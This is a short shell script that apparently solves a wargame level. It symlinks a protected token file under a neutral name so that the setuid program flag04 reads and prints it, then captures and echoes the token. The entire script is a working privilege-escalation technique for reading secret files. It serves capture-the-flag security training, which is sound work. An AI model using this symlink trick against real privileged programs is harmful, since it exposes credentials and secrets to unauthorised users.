ln -s /home/flag04/token ~/file
token=`/home/flag04/flag04 ~/file`
rm ~/file
echo "Token: ${token}"
exit 0
